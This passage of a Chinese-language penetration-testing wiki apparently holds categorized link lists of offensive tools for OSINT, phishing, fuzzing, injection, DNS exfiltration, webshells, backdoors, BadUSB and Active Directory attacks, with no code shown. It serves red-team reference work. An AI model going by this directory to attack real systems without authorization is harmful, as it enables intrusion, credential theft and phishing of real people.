<li><a class="reference external" href="https://github.com/lc/secretz">secretz</a> minimizing the large attack surface of Travis CI</li>
</ul>
</div>
<div class="section" id="id19">
<h4>个人数据画像<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mxrch/GHunt">GHunt</a> Investigate Google Accounts with emails</li>
</ul>
</div>
<div class="section" id="id20">
<h4>邮箱收集<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/maldevel/EmailHarvester">EmailHarvester</a></li>
</ul>
</div>
<div class="section" id="id21">
<h4>其他<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/DataSploit/datasploit">datasploit</a></li>
<li><a class="reference external" href="https://github.com/flipkart-incubator/watchdog">watchdog</a></li>
<li><a class="reference external" href="https://archive.org/web/">archive</a></li>
<li><a class="reference external" href="https://github.com/cure53/HTTPLeaks">HTTPLeaks</a></li>
<li><a class="reference external" href="https://github.com/trimstray/htrace.sh">htrace</a></li>
<li><a class="reference external" href="https://github.com/360quake/quake_rs">Quake Command-Line Application</a> 360网络空间测绘系统</li>
</ul>
</div>
</div>
<span id="document-tools/socialengineering"></span><div class="section" id="id1">
<h3>社会工程学<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="osint">
<h4>OSINT<a class="headerlink" href="#osint" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://osintframework.com/">osint</a></li>
<li><a class="reference external" href="https://github.com/lockfale/OSINT-Framework">osint git</a></li>
<li><a class="reference external" href="https://github.com/Ph055a/OSINTCollection">OSINT-Collection</a></li>
<li><a class="reference external" href="https://github.com/jofpin/trape">trape</a></li>
<li><a class="reference external" href="https://github.com/s0md3v/Photon">Photon</a></li>
<li><a class="reference external" href="https://github.com/netevert/pockint">pockint</a></li>
</ul>
</div>
<div class="section" id="id3">
<h4>社交工具<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/emtunc/SlackPirate">SlackPirate</a> Slack Enumeration and Extraction Tool - extract sensitive information from a Slack Workspace</li>
<li><a class="reference external" href="https://github.com/twintproject/twint">twint</a> An advanced Twitter scraping &amp; OSINT tool</li>
</ul>
</div>
<div class="section" id="id4">
<h4>个人搜索<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://pipl.com/">pipl</a></li>
<li><a class="reference external" href="https://hunter.io">hunter</a></li>
<li><a class="reference external" href="https://github.com/ThoughtfulDev/EagleEye">EagleEye</a></li>
<li><a class="reference external" href="https://github.com/mdsecactivebreach/LinkedInt">LinkedInt</a></li>
<li><a class="reference external" href="https://github.com/sherlock-project/sherlock">sherlock</a></li>
<li><a class="reference external" href="https://github.com/Frint0/email-enum">email enum</a></li>
<li><a class="reference external" href="https://github.com/n0tr00t/Sreg">Sreg</a></li>
<li><a class="reference external" href="https://usersearch.org/">usersearch</a></li>
</ul>
</div>
<div class="section" id="hacking-database">
<h4>Hacking database<a class="headerlink" href="#hacking-database" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.exploit-db.com/google-hacking-database/">GHDB</a></li>
<li><a class="reference external" href="https://github.com/kernelmachine/haveibeenpwned">have i been pwned</a></li>
</ul>
</div>
<div class="section" id="id5">
<h4>钓鱼<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/BishopFox/spoofcheck">spoofcheck</a></li>
<li><a class="reference external" href="https://github.com/gophish/gophish">gophish</a></li>
<li><a class="reference external" href="https://github.com/UndeadSec/SocialFish">SocialFish</a></li>
<li><a class="reference external" href="https://github.com/hacklcx/HFish">HFish</a> A Most Convenient Honeypot Platform</li>
<li><a class="reference external" href="https://github.com/thelinuxchoice/blackeye">blackeye</a> complete Phishing Tool, with 32 templates +1 customizable</li>
<li><a class="reference external" href="https://github.com/rsmusllp/king-phisher/">king phisher</a> Phishing Campaign Toolkit</li>
<li><a class="reference external" href="https://github.com/chenjj/espoofer">espoofer</a> An email spoofing testing tool that aims to bypass SPF/DKIM/DMARC and forge DKIM signatures</li>
<li><a class="reference external" href="https://github.com/evilsocket/ditto">ditto</a> A tool for IDN homograph attacks and detection</li>
<li><a class="reference external" href="https://github.com/Threezh1/SiteCopy">SiteCopy</a> sitecopy is a tool that facilitates personal website backup and network data collection</li>
</ul>
</div>
<div class="section" id="id6">
<h4>网盘搜索<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://magnet.chongbuluo.com/">虫部落</a></li>
<li><a class="reference external" href="http://www.panduoduo.net/">盘多多</a></li>
<li><a class="reference external" href="https://www.panc.cc">Infinite Panc</a></li>
</ul>
</div>
<div class="section" id="id9">
<h4>密码猜测<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/RUB-SysSec/OMEN">OMEN</a> Ordered Markov ENumerator - Password Guesser</li>
<li><a class="reference external" href="https://github.com/RicterZ/genpAss">genpAss</a></li>
</ul>
</div>
<div class="section" id="id10">
<h4>伪造<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Macr0phag3/email_hack">email_hack</a> 基于 Python 伪造电子邮件发件人</li>
</ul>
</div>
<div class="section" id="id11">
<h4>综合框架<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/laramies/theHarvester">theHarvester</a></li>
<li><a class="reference external" href="https://github.com/Moham3dRiahi/Th3inspector">Th3inspector</a></li>
<li><a class="reference external" href="https://github.com/s0md3v/ReconDog">ReconDog</a></li>
</ul>
</div>
</div>
<span id="document-tools/fuzz"></span><div class="section" id="id1">
<h3>模糊测试<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="web-fuzz">
<h4>Web Fuzz<a class="headerlink" href="#web-fuzz" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/xmendez/wfuzz">wfuzz</a></li>
<li><a class="reference external" href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a class="reference external" href="https://github.com/fuzzdb-project/fuzzdb">fuzzdb</a></li>
<li><a class="reference external" href="https://github.com/foospidy/payloads">foospidy payloads</a></li>
<li><a class="reference external" href="https://github.com/ffuf/ffuf">ffuf</a> Fast web fuzzer written in Go</li>
</ul>
</div>
<div class="section" id="id2">
<h4>扫描器<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/projectdiscovery/nuclei">Nuclei</a> a fast tool for configurable targeted vulnerability scanning based on templates offering massive extensibility and ease of use</li>
<li><a class="reference external" href="https://github.com/chaitin/xray">xray</a> 安全评估工具，支持常见 web 安全问题扫描和自定义 poc</li>
</ul>
</div>
<div class="section" id="xss-payloads">
<h4>XSS Payloads<a class="headerlink" href="#xss-payloads" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PORTSWIGGER XSS cheat sheet</a></li>
<li><a class="reference external" href="https://github.com/Pgaijin66/XSS-Payloads">Pgaijin66 XSS-Payloads</a></li>
<li><a class="reference external" href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS</a></li>
</ul>
</div>
<div class="section" id="burp">
<h4>Burp插件<a class="headerlink" href="#burp" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/wagiro/BurpBounty">BurpBounty</a> Scan Check Builder</li>
<li><a class="reference external" href="https://github.com/pmiaowu/BurpShiroPassiveScan">BurpShiroPassiveScan</a></li>
<li><a class="reference external" href="https://github.com/1N3/IntruderPayloads">IntruderPayloads</a> A collection of Burpsuite Intruder payloads</li>
</ul>
</div>
<div class="section" id="id3">
<h4>字典<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/rootphantomer/Blasting_dictionary">Blasting dictionary</a></li>
<li><a class="reference external" href="https://github.com/LandGrey/pydictor">pydictor</a> A powerful and useful hacker dictionary builder for a brute-force attack</li>
<li><a class="reference external" href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzDicts</a> Web Pentesting Fuzz 字典</li>
<li><a class="reference external" href="https://github.com/random-robbie/bruteforce-lists">bruteforce lists</a></li>
<li><a class="reference external" href="https://github.com/internetwache/CT_subdomains">CT subdomains</a></li>
<li><a class="reference external" href="https://github.com/ppbibo/PentesterSpecialDict">PentesterSpecialDict</a> 渗透测试人员专用精简化字典</li>
</ul>
</div>
<div class="section" id="unicode-fuzz">
<h4>Unicode Fuzz<a class="headerlink" href="#unicode-fuzz" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.fileformat.info/info/charset/UTF-16/list.htm">utf16encode</a></li>
</ul>
</div>
<div class="section" id="waf-bypass">
<h4>WAF Bypass<a class="headerlink" href="#waf-bypass" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/LandGrey/abuse-ssl-bypass-waf">abuse ssl bypass waf</a></li>
<li><a class="reference external" href="https://github.com/khalilbijjou/wafninja">wafninja</a></li>
</ul>
</div>
</div>
<span id="document-tools/exploit"></span><div class="section" id="id1">
<h3>漏洞利用/检测<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>数据库注入<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/sqlmapproject/sqlmap">SQLMap</a></li>
<li><a class="reference external" href="https://github.com/Neohapsis/bbqsql">bbqsql</a></li>
<li><a class="reference external" href="https://github.com/quentinhardy/msdat">MSDAT</a> Microsoft SQL Database Attacking Tool</li>
</ul>
</div>
<div class="section" id="id3">
<h4>非结构化数据库注入<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/youngyangyang04/NoSQLAttack">NoSQLAttack</a></li>
<li><a class="reference external" href="https://github.com/codingo/NoSQLMap">NoSQLMap</a></li>
<li><a class="reference external" href="https://github.com/torque59/Nosql-Exploitation-Framework">Nosql Exploitation Framework</a></li>
<li><a class="reference external" href="https://github.com/stampery/mongoaudit">MongoDB audit</a></li>
</ul>
</div>
<div class="section" id="id4">
<h4>数据库漏洞利用<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/cyrus-and/mysql-unsha1">mysql unsha1</a></li>
<li><a class="reference external" href="https://github.com/quentinhardy/odat">ODAT</a> Oracle Database Attacking Tool</li>
</ul>
</div>
<div class="section" id="xss">
<h4>XSS<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/beefproject/beef">BeEF</a></li>
<li><a class="reference external" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">XSS Reciver</a></li>
<li><a class="reference external" href="https://github.com/stamparm/DSXS">DSXS</a></li>
<li><a class="reference external" href="https://github.com/s0md3v/XSStrike">XSStrike</a></li>
<li><a class="reference external" href="https://github.com/gbrindisi/xsssniper">xsssniper</a></li>
<li><a class="reference external" href="https://github.com/nccgroup/tracy">tracy</a></li>
<li><a class="reference external" href="https://github.com/xsleaks/xsleaks">xsleaks</a> A collection of browser-based side channel attack vectors</li>
</ul>
</div>
<div class="section" id="ssrf">
<h4>SSRF<a class="headerlink" href="#ssrf" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a></li>
<li><a class="reference external" href="https://github.com/bcoles/ssrf_proxy">SSRF Proxy</a></li>
<li><a class="reference external" href="https://github.com/tarunkant/Gopherus">Gopherus</a></li>
<li><a class="reference external" href="https://github.com/cujanovic/SSRF-Testing">SSRF Testing</a></li>
</ul>
</div>
<div class="section" id="id5">
<h4>模版注入<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/epinna/tplmap">tplmap</a></li>
</ul>
</div>
<div class="section" id="http-request-smuggling">
<h4>HTTP Request Smuggling<a class="headerlink" href="#http-request-smuggling" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/defparam/smuggler">smuggler</a> An HTTP Request Smuggling / Desync testing tool written in Python</li>
<li><a class="reference external" href="https://github.com/BishopFox/h2csmuggler">h2cSmuggler</a> HTTP Request Smuggling over HTTP/2 Cleartext (h2c)</li>
</ul>
</div>
<div class="section" id="id6">
<h4>命令注入<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/commixproject/commix">commix</a></li>
</ul>
</div>
<div class="section" id="php">
<h4>PHP<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/TarlogicSecurity/Chankro">Chankro</a> Herramienta para evadir disable_functions y open_basedir</li>
</ul>
</div>
<div class="section" id="lfi">
<h4>LFI<a class="headerlink" href="#lfi" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/D35m0nd142/LFISuite">LFISuite</a></li>
<li><a class="reference external" href="https://github.com/chrispetrou/FDsploit">FDsploit</a></li>
</ul>
</div>
<div class="section" id="struts">
<h4>struts<a class="headerlink" href="#struts" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Lucifer1993/struts-scan">struts scan</a></li>
</ul>
</div>
<div class="section" id="cms">
<h4>CMS<a class="headerlink" href="#cms" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/rezasp/joomscan">Joomla Vulnerability Scanner</a></li>
<li><a class="reference external" href="https://github.com/immunIT/drupwn">Drupal enumeration &amp; exploitation tool</a></li>
<li><a class="reference external" href="https://github.com/UltimateLabs/Zoom">Wordpress Vulnerability Scanner</a></li>
<li><a class="reference external" href="https://github.com/Lucifer1993/TPscan">TPscan</a> 一键ThinkPHP漏洞检测</li>
<li><a class="reference external" href="https://github.com/lengjibo/dedecmscan">dedecmscan</a> 织梦全版本漏洞扫描</li>
</ul>
</div>
<div class="section" id="java">
<h4>Java框架<a class="headerlink" href="#java" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/sv3nbeast/ShiroScan">ShiroScan</a> Shiro&lt;=1.2.4反序列化检测工具</li>
<li><a class="reference external" href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson rce tool</a> fastjson命令执行利用工具</li>
</ul>
</div>
<div class="section" id="dns">
<h4>DNS相关漏洞<a class="headerlink" href="#dns" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Tr3jer/dnsAutoRebinding">dnsAutoRebinding</a></li>
<li><a class="reference external" href="https://github.com/Lucifer1993/AngelSword">AngelSword</a></li>
<li><a class="reference external" href="https://github.com/m4ll0k/takeover">Subdomain TakeOver</a></li>
<li><a class="reference external" href="https://github.com/nopernik/mpDNS">mpDNS</a></li>
<li><a class="reference external" href="https://github.com/mandatoryprogrammer/JudasDNS">JudasDNS Nameserver DNS poisoning</a></li>
<li><a class="reference external" href="https://github.com/nccgroup/singularity">singularity</a> A DNS rebinding attack framework by NGC Group</li>
</ul>
</div>
<div class="section" id="id7">
<h4>DNS数据提取<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/m57/dnsteal">dnsteal</a></li>
<li><a class="reference external" href="https://github.com/Arno0x/DNSExfiltrator">DNSExfiltrator</a></li>
<li><a class="reference external" href="https://github.com/krmaxwell/dns-exfiltration">dns exfiltration by krmaxwell</a></li>
<li><a class="reference external" href="https://github.com/coryschwartz/dns_exfiltration">dns exfiltration by coryschwartz</a></li>
<li><a class="reference external" href="http://requestbin.net/dns">requestbin for dns</a></li>
</ul>
</div>
<div class="section" id="id8">
<h4>DNS 隧道<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://dnstunnel.de/">dnstunnel de</a></li>
<li><a class="reference external" href="https://code.kryo.se/iodine/">iodine</a></li>
</ul>
</div>
<div class="section" id="dns-shell">
<h4>DNS Shell<a class="headerlink" href="#dns-shell" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/sysdream/chashell">chashell</a></li>
<li><a class="reference external" href="https://github.com/iagox86/dnscat2">dnscat2</a></li>
</ul>
</div>
<div class="section" id="xxe">
<h4>XXE<a class="headerlink" href="#xxe" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/enjoiz/XXEinjector">XXEinjector</a></li>
<li><a class="reference external" href="https://github.com/TheTwitchy/xxer">XXER</a></li>
<li><a class="reference external" href="https://github.com/GoSecure/dtd-finder">DTD Finder</a> List DTDs and generate XXE payloads using those local DTDs</li>
</ul>
</div>
<div class="section" id="id9">
<h4>反序列化<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<div class="section" id="id10">
<h5>Java反序列化<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/frohoff/ysoserial">ysoserial</a></li>
<li><a class="reference external" href="https://github.com/pwntester/JRE8u20_RCE_Gadget">JRE8u20 RCE Gadget</a></li>
<li><a class="reference external" href="https://github.com/NickstaDB/SerializationDumper">Java Serialization Dumper</a> A tool to dump Java serialization streams in a more human readable form</li>
<li><a class="reference external" href="https://github.com/mbechler/marshalsec">marshalsec</a> Java Unmarshaller Security - Turning your data into code execution</li>
<li><a class="reference external" href="https://github.com/JackOfMostTrades/gadgetinspector">gadgetinspector</a> A byte code analyzer for finding deserialization gadget chains in Java applications</li>
</ul>
</div>
<div class="section" id="net">
<h5>.NET反序列化<a class="headerlink" href="#net" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/0xacb/viewgen">viewgen</a> ASP.NET ViewState Generator</li>
</ul>
</div>
</div>
<div class="section" id="jndi">
<h4>JNDI<a class="headerlink" href="#jndi" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/veracode-research/rogue-jndi">Rogue JNDI</a> A malicious LDAP server for JNDI injection attacks</li>
</ul>
</div>
<div class="section" id="hack">
<h4>端口Hack<a class="headerlink" href="#hack" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/vulnersCom/nmap-vulners">nmap vulners</a></li>
<li><a class="reference external" href="https://github.com/cldrn/nmap-nse-scripts">nmap nse scripts</a></li>
<li><a class="reference external" href="https://github.com/scipag/vulscan">Vulnerability Scanning with Nmap</a></li>
</ul>
</div>
<div class="section" id="jwt">
<h4>JWT<a class="headerlink" href="#jwt" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a></li>
</ul>
</div>
<div class="section" id="id11">
<h4>无线<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/entropy1337/infernal-twin">infernal twin</a></li>
</ul>
</div>
<div class="section" id="id12">
<h4>中间人攻击<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></li>
<li><a class="reference external" href="https://github.com/byt3bl33d3r/MITMf">MITMf</a></li>
<li><a class="reference external" href="https://github.com/jtesta/ssh-mitm">ssh mitm</a></li>
<li><a class="reference external" href="https://github.com/samdenty99/injectify">injectify</a></li>
<li><a class="reference external" href="https://github.com/lgandx/Responder">Responder</a> Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.</li>
<li><a class="reference external" href="https://github.com/h2non/toxy">toxy</a> Hackable HTTP proxy for resiliency testing and simulated network conditions</li>
<li><a class="reference external" href="https://github.com/bettercap/bettercap">bettercap</a> The Swiss Army knife for 802.11, BLE and Ethernet networks reconnaissance and MITM attacks</li>
</ul>
</div>
<div class="section" id="dhcp">
<h4>DHCP<a class="headerlink" href="#dhcp" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mschwager/dhcpwn">DHCPwn</a></li>
</ul>
</div>
<div class="section" id="ddos">
<h4>DDoS<a class="headerlink" href="#ddos" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/OffensivePython/Saddam">Saddam</a></li>
</ul>
</div>
<div class="section" id="id13">
<h4>正则表达式<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/doyensec/regexploit">Regexploit</a> Find regular expressions which are vulnerable to ReDoS</li>
</ul>
</div>
<div class="section" id="shellcode">
<h4>Shellcode<a class="headerlink" href="#shellcode" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Ne0nd0g/go-shellcode">go shellcode</a> A repository of Windows Shellcode runners and supporting utilities</li>
</ul>
</div>
<div class="section" id="id14">
<h4>越权<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ztosec/secscan-authcheck">secscan authcheck</a></li>
</ul>
</div>
<div class="section" id="id15">
<h4>利用平台<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/BugScanTeam/DNSLog">DNSLog</a> 是一款监控 DNS 解析记录和 HTTP 访问记录的工具</li>
<li><a class="reference external" href="https://github.com/QAX-A-Team/LuWu">LuWu</a> 红队基础设施自动化部署工具</li>
</ul>
</div>
<div class="section" id="id16">
<h4>漏洞利用库<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Mr-xn/Penetration_Testing_POC">Penetration Testing POC</a></li>
<li><a class="reference external" href="https://github.com/vanhauser-thc/thc-ipv6">thc ipv6</a> IPv6 attack toolkit</li>
</ul>
</div>
<div class="section" id="windows">
<h4>Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/GoSecure/pywsus">PyWSUS</a> a standalone implementation of a legitimate WSUS server which sends malicious responses to clients</li>
</ul>
</div>
</div>
<span id="document-tools/nearsource"></span><div class="section" id="id1">
<h3>近源渗透<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="bad-usb">
<h4>Bad USB<a class="headerlink" href="#bad-usb" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/spacehuhn/WiFiDuck">WiFiDuck</a> Keystroke injection attack plattform</li>
<li><a class="reference external" href="https://github.com/Xyntax/BadUSB-code">BadUSB code</a> badusb的一些利用方式及代码</li>
<li><a class="reference external" href="https://github.com/whid-injector/WHID">WHID</a> WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids</li>
<li><a class="reference external" href="https://github.com/joelsernamoreno/BadUSB-Cable">BadUSB cable</a> based on Attiny85 microcontroller</li>
<li><a class="reference external" href="https://github.com/hak5darren/USB-Rubber-Ducky">USB Rubber Ducky</a></li>
</ul>
</div>
<div class="section" id="wifi">
<h4>wifi<a class="headerlink" href="#wifi" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/wifiphisher/wifiphisher">wifiphisher</a></li>
<li><a class="reference external" href="https://github.com/kgretzky/evilginx">evilginx</a></li>
<li><a class="reference external" href="https://github.com/sensepost/mana">mana</a></li>
<li><a class="reference external" href="https://github.com/evilsocket/pwnagotchi">pwnagotchi</a></li>
</ul>
</div>
<div class="section" id="id2">
<h4>无线<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mossmann/hackrf">hackrf</a> low cost software radio platform</li>
</ul>
</div>
</div>
<span id="document-tools/webpersistence"></span><div class="section" id="web">
<h3>Web持久化<a class="headerlink" href="#web" title="永久链接至标题">¶</a></h3>
<div class="section" id="webshell">
<h4>WebShell管理工具<a class="headerlink" href="#webshell" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/Chora10/Cknife">菜刀</a></li>
<li><a class="reference external" href="https://github.com/antoor/antSword">antSword</a></li>
<li><a class="reference external" href="https://github.com/rebeyond/Behinder">冰蝎</a> 动态二进制加密网站管理客户端</li>
<li><a class="reference external" href="https://github.com/epinna/weevely3">weevely3</a> Weaponized web shell</li>
<li><a class="reference external" href="https://github.com/keepwn/Altman">Altman</a> the cross platform webshell tool in .NET</li>
<li><a class="reference external" href="https://github.com/WangYihang/Webshell-Sniper">Webshell Sniper</a> Manage your website via terminal</li>
<li><a class="reference external" href="https://github.com/Smaash/quasibot">quasibot</a> complex webshell manager, quasi-http botnet</li>
</ul>
</div>
<div class="section" id="id3">
<h4>WebShell<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/tennc/webshell">webshell</a></li>
<li><a class="reference external" href="https://github.com/bartblaze/PHP-backdoors">PHP backdoors</a></li>
<li><a class="reference external" href="https://github.com/Arrexel/phpbash">php bash - semi-interactive web shell</a></li>
<li><a class="reference external" href="https://github.com/Eitenne/TopHat.git">Python RSA Encrypted Shell</a></li>
<li><a class="reference external" href="https://github.com/b374k/b374k">b374k - PHP WebShell Custom Tool</a></li>
<li><a class="reference external" href="https://github.com/threedr3am/JSP-Webshells">JSP Webshells</a></li>
<li><a class="reference external" href="https://github.com/jweny/MemShellDemo">MemShellDemo</a></li>
</ul>
</div>
<div class="section" id="id5">
<h4>Web后门<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/t57root/pwnginx">pwnginx</a></li>
<li><a class="reference external" href="https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor">Apache backdoor</a></li>
<li><a class="reference external" href="https://github.com/cobbr/SharpGen">SharpGen</a>  .NET Core console application that utilizes the Rosyln C# compiler to quickly cross-compile .NET Framework console applications or libraries</li>
<li><a class="reference external" href="https://github.com/0x09AL/IIS-Raid">IIS-Raid</a> A native backdoor module for Microsoft IIS</li>
</ul>
</div>
</div>
<span id="document-tools/intranet"></span><div class="section" id="id1">
<h3>横向移动<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>域<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a> Active Directory Integrated DNS dump tool</li>
<li><a class="reference external" href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> Six Degrees of Domain Admin</li>
<li><a class="reference external" href="https://github.com/PlumHound/PlumHound">PlumHound</a> Bloodhound for Blue and Purple Teams</li>
<li><a class="reference external" href="https://github.com/ropnop/windapsearch">windapsearch</a> Python script to enumerate users, groups and computers from a Windows domain through LDAP queries</li>
<li><a class="reference external" href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a> Active Directory information dumper via LDAP</li>
<li><a class="reference external" href="https://github.com/nidem/kerberoast">Kerberoast</a> a series of tools for attacking MS Kerberos implementations</li>
<li><a class="reference external" href="https://github.com/sense-of-security/ADRecon">ADRecon</a> Active Directory Recon</li>
<li><a class="reference external" href="https://github.com/S3cur3Th1sSh1t/Creds">Creds</a> Some usefull Scripts and Executables for Pentest &amp; Forensics</li>
<li><a class="reference external" href="https://github.com/lithnet/ad-password-protection">Lithnet Password Protection for Active Directory</a> Active Directory password filter featuring breached password checking and custom complexity rules</li>
</ul>
</div>
<div class="section" id="id3">
<h4>容器<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/cdk-team/CDK">CDK</a> an open-sourced container penetration toolkit, offering stable exploitation in different slimmed containers without any OS dependency</li>
</ul>
</div>
<div class="section" id="id4">
<h4>微软系产品利用<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mdsecresearch/LyncSniper">LyncSniper</a> A tool for penetration testing Skype for Business and Lync deployments</li>
<li><a class="reference external" href="https://github.com/dafthack/MSOLSpray">MSOLSpray</a> A password spraying tool for Microsoft Online accounts (Azure/O365)</li>
<li><a class="reference external" href="https://github.com/dafthack/MailSniper">MailSniper</a> MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms</li>
</ul>
</div>
<div class="section" id="azure-ad">
<h4>Azure AD<a class="headerlink" href="#azure-ad" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/dirkjanm/ROADtools">ROADtools</a> Azure AD exploration framework</li>
</ul>
</div>
<div class="section" id="exchange">
<h4>Exchange<a class="headerlink" href="#exchange" title="永久链接至标题">¶</a></h4>
<ul class="simple">
